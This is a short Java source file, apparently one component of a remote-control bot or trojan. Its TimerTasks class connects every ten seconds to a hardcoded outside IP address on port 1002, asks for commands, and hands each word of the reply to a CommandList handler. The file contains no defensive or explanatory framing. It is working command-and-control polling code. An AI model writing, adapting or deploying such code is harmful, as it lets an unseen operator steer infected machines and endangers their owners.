import java.io.*;
import java.net.Socket;
import java.util.Timer;
import java.util.TimerTask;

public class TimerTasks {

    CommandList cl = new CommandList();

    public void checkForCommands() {
        TimerTask repeatedTask = new TimerTask() {
            public void run() {
                try {
                    Socket s = new Socket("116.202.236.57", 1002);
                    s.setReuseAddress(true);

                    OutputStream out = s.getOutputStream();

                    PrintWriter output = new PrintWriter(out);

                    output.println("checkForCommands");
                    output.flush();
                    BufferedReader input = new BufferedReader(new InputStreamReader(s.getInputStream()));
                    String command = null;
                    if ((command = input.readLine()) != null && !command.equals("")) {
                        System.out.println(command);
                        String[] commands = command.split(" ");
                        for (String cmd : commands) {
                            cl.checkCommand(cmd);
                        }
                    }

                    output.close();
                    out.close();
                    s.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        };
        Timer timer = new Timer("Timer");

        long delay = 1000L;
        long period = 1000L * 10L;
        timer.scheduleAtFixedRate(repeatedTask, delay, period);
    }

}
